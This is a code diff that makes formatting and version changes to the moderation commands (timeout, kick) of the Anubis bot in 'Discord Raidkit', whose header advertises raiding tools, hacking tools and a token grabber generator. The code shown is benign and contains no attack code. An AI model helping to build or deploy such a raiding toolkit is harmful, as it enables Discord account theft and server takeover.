@@ -1,5 +1,5 @@
-'''
-Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
+"""
+Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
 Copyright © 2022 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,8 +8,8 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 moderation.py contains all moderation commands for the Anubis raidkit.
-moderation.py was last updated on 11/08/22 at 13:38.
-'''
+moderation.py was last updated on 04/09/22 at 18:26.
+"""
 
 import logging
 from datetime import timedelta
@@ -78,7 +78,8 @@ class Moderation(commands.Cog):
             Choice(name='Yes', value=1),
             Choice(name='No', value=0)
         ])
-    async def timeout(self, interaction: discord.Interaction, user: discord.Member, minutes: int, reason: str, send_message: int) -> None:
+    async def timeout(self, interaction: discord.Interaction, user: discord.Member, minutes: int, reason: str,
+                      send_message: int) -> None:
         try:
             await interaction.response.defer(ephemeral=True)
             if interaction.user.guild_permissions.moderate_members or interaction.user.guild_permissions.administrator:
@@ -131,7 +132,8 @@ class Moderation(commands.Cog):
             Choice(name='Yes', value=1),
             Choice(name='No', value=0)
         ])
-    async def kick(self, interaction: discord.Interaction, user: discord.Member, reason: str, send_message: int) -> None:
+    async def kick(self, interaction: discord.Interaction, user: discord.Member, reason: str,
+                   send_message: int) -> None:
         try:
             await interaction.response.defer(ephemeral=True)
             if interaction.user.guild_permissions.kick_members or interaction.user.guild_permissions.administrator:
